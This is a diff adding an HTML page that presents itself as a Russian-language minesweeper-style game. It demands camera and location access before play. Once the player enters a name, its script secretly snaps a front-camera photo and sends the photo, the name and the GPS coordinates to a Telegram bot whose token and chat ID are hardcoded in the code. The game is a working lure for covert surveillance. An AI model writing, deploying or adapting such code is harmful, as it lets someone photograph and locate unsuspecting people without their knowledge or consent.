@@ -1,1 +1,321 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Мини-игра Бомбы</title>
+<style>
+  body {
+    margin: 0; padding: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #232526, #1c1c1c);
+    color: #eee;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+    user-select: none;
+  }
+  #name-section, #game, #permission-denied {
+    display: none;
+    text-align: center;
+  }
+  #name-section.active, #game.active {
+    display: block;
+  }
+  #permission-denied.active {
+    display: block;
+    color: #f44336;
+    font-weight: bold;
+  }
+  input[type="text"] {
+    font-size: 18px;
+    padding: 8px 12px;
+    border-radius: 6px;
+    border: none;
+    margin-right: 10px;
+    width: 200px;
+  }
+  button {
+    cursor: pointer;
+    padding: 10px 16px;
+    font-size: 18px;
+    border-radius: 6px;
+    border: none;
+    background-color: #4CAF50;
+    color: white;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #45a049;
+  }
+  #error-msg {
+    margin-top: 8px;
+    color: #f44336;
+  }
+  #game-board {
+    margin-top: 20px;
+    display: grid;
+    grid-template-columns: repeat(8, 40px);
+    grid-template-rows: repeat(8, 40px);
+    gap: 4px;
+    user-select: none;
+  }
+  .cell {
+    width: 40px;
+    height: 40px;
+    background-color: #444;
+    border-radius: 4px;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-weight: bold;
+    font-size: 20px;
+  }
+  .cell.open {
+    background-color: #eee;
+    color: #222;
+    cursor: default;
+  }
+  .cell.bomb {
+    background-color: #e74c3c;
+    color: white;
+  }
+</style>
+</head>
+<body>
 
+<div id="permission-denied">
+  <p>Для игры нужно разрешить доступ к камере и местоположению.<br>Перезагрузите страницу и разрешите.</p>
+</div>
+
+<div id="name-section">
+  <input type="text" id="player-name" placeholder="Введите имя" autocomplete="off" />
+  <button id="start-game-btn">Начать игру</button>
+  <div id="error-msg"></div>
+</div>
+
+<div id="game">
+  <h2>Игра: Бомбы</h2>
+  <div id="game-board"></div>
+  <p id="status"></p>
+</div>
+
+<script>
+(async () => {
+  const permissionDeniedDiv = document.getElementById('permission-denied');
+  const nameSection = document.getElementById('name-section');
+  const gameDiv = document.getElementById('game');
+  const playerNameInput = document.getElementById('player-name');
+  const startGameBtn = document.getElementById('start-game-btn');
+  const errorMsg = document.getElementById('error-msg');
+  const gameBoard = document.getElementById('game-board');
+  const statusP = document.getElementById('status');
+
+  let stream = null;
+  let coords = null;
+  let photoBlob = null;
+  let playerName = '';
+
+  // Запрос камеры (фронтальная) и геолокации
+  async function requestPermissions() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      coords = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout:10000});
+      });
+      return true;
+    } catch(e) {
+      return false;
+    }
+  }
+
+  // Сделать фото с камеры
+  async function takePhoto() {
+    if (!stream) return null;
+    const track = stream.getVideoTracks()[0];
+    if ('ImageCapture' in window) {
+      try {
+        const imageCapture = new ImageCapture(track);
+        const photo = await imageCapture.takePhoto();
+        return photo;
+      } catch(e) {
+        // fallback
+      }
+    }
+    // fallback: сделать фото через canvas
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 320;
+    canvas.height = video.videoHeight || 240;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    video.pause();
+    track.stop();
+    return await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+  }
+
+  const hasPermissions = await requestPermissions();
+  if (!hasPermissions) {
+    permissionDeniedDiv.classList.add('active');
+    return;
+  }
+
+  nameSection.classList.add('active');
+
+  startGameBtn.onclick = async () => {
+    playerName = playerNameInput.value.trim();
+    if (playerName.length < 1) {
+      errorMsg.textContent = "Пожалуйста, введите имя.";
+      return;
+    }
+    errorMsg.textContent = "";
+
+    photoBlob = await takePhoto();
+
+    // Отправка в Telegram
+    sendDataToTelegram(playerName, coords.coords.latitude, coords.coords.longitude, photoBlob);
+
+    nameSection.classList.remove('active');
+    startGame();
+  };
+
+  // Игра — мини "Бомбы"
+  const size = 8;
+  const bombsCount = 10;
+  let board = [];
+  let openedCount = 0;
+  let gameOver = false;
+
+  function startGame() {
+    gameDiv.classList.add('active');
+    statusP.textContent = '';
+    board = createBoard(size, bombsCount);
+    openedCount = 0;
+    gameOver = false;
+    renderBoard();
+  }
+
+  function createBoard(size, bombsCount) {
+    // Создаём массив клеток
+    const board = Array(size * size).fill({bomb: false, open: false, adjacent: 0});
+    // Для мутирования надо сделать копию объектов
+    let cells = [];
+    for(let i=0; i<size*size; i++) {
+      cells.push({bomb:false, open:false, adjacent:0});
+    }
+
+    // Расставляем бомбы
+    let bombsPlaced = 0;
+    while (bombsPlaced < bombsCount) {
+      const idx = Math.floor(Math.random() * size * size);
+      if (!cells[idx].bomb) {
+        cells[idx].bomb = true;
+        bombsPlaced++;
+      }
+    }
+
+    // Считаем соседние бомбы для каждой клетки
+    for (let i=0; i<size*size; i++) {
+      if (cells[i].bomb) continue;
+      const neighbors = getNeighbors(i, size);
+      let count = 0;
+      for (const n of neighbors) {
+        if (cells[n].bomb) count++;
+      }
+      cells[i].adjacent = count;
+    }
+    return cells;
+  }
+
+  function getNeighbors(index, size) {
+    const neighbors = [];
+    const row = Math.floor(index / size);
+    const col = index % size;
+    for (let r = row - 1; r <= row + 1; r++) {
+      for (let c = col -1; c <= col + 1; c++) {
+        if (r < 0 || r >= size || c < 0 || c >= size) continue;
+        if (r === row && c === col) continue;
+        neighbors.push(r * size + c);
+      }
+    }
+    return neighbors;
+  }
+
+  function renderBoard() {
+    gameBoard.innerHTML = '';
+    for(let i=0; i<board.length; i++) {
+      const cell = document.createElement('div');
+      cell.classList.add('cell');
+      if (board[i].open) cell.classList.add('open');
+      if (board[i].open && board[i].bomb) cell.classList.add('bomb');
+      cell.dataset.index = i;
+      cell.addEventListener('click', () => onCellClick(i));
+      gameBoard.appendChild(cell);
+    }
+  }
+
+  function openCell(i) {
+    if (board[i].open || gameOver) return;
+    board[i].open = true;
+    openedCount++;
+    if (board[i].bomb) {
+      gameOver = true;
+      revealBombs();
+      statusP.textContent = "Вы взорвались! Игра окончена.";
+      return;
+    }
+    if (board[i].adjacent === 0) {
+      const neighbors = getNeighbors(i, size);
+      neighbors.forEach(n => openCell(n));
+    }
+    if (openedCount === size*size - bombsCount) {
+      gameOver = true;
+      statusP.textContent = "Поздравляем! Вы выиграли!";
+      revealBombs();
+    }
+  }
+
+  function revealBombs() {
+    for(let i=0; i<board.length; i++) {
+      if (board[i].bomb) board[i].open = true;
+    }
+    renderBoard();
+  }
+
+  function onCellClick(i) {
+    openCell(i);
+    renderBoard();
+  }
+
+  function sendDataToTelegram(name, lat, lon, photoBlob) {
+    // Отправляем текст с именем и координатами
+    const text = `Новый игрок: ${name}\nШирота: ${lat}\nДолгота: ${lon}`;
+
+    // Отправка текста
+    fetch(`https://api.telegram.org/bot7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M/sendMessage?chat_id=526758225&text=${encodeURIComponent(text)}`)
+      .catch(console.error);
+
+    // Отправка фото, если есть
+    if (photoBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', '526758225');
+      formData.append('photo', photoBlob, 'photo.jpg');
+      formData.append('caption', `Фото игрока: ${name}`);
+
+      fetch(`https://api.telegram.org/bot7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).catch(console.error);
+    }
+  }
+
+})();
+</script>
+
+</body>
+</html>
